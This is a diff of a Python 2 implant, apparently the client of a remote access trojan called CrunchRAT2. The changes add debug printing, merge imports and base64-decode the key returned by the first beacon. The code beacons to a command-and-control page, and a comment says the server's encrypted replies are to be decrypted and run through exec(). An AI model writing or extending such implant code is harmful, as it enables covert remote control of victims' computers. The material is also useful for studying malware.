@@ -1,6 +1,5 @@
-import base64, urllib, urllib2, getpass, os, platform, random, socket, string, sys, time
+import base64, urllib, urllib2, getpass, os, platform, random, socket, string, sys, time, json
 
-import json
 
 # TO DO: Remove hard-coded value
 beacon_url = "http://127.0.0.1/CrunchRAT2/Website/beacon.php"
@@ -56,6 +55,7 @@ def initial_beacon():
         request.add_header("User-Agent", user_agent)
         f = urllib2.urlopen(request)
         response = f.read()
+        print response
         return response
     except:
         pass
@@ -78,6 +78,7 @@ def rc4_beacon(key):
         request.add_header("Content-Type", "application/json")
         f = urllib2.urlopen(request)
         response = f.read()
+        print response
         return response
     except:
         pass
@@ -88,7 +89,7 @@ if __name__ == "__main__":
 
     while True:
         if counter == 0:
-            k = initial_beacon()
+            k = base64.b64decode(initial_beacon())
         else:
             rc4_beacon(k) # TO DO: This the output returned from this will get decrypted and ran through a Python exec() function
 
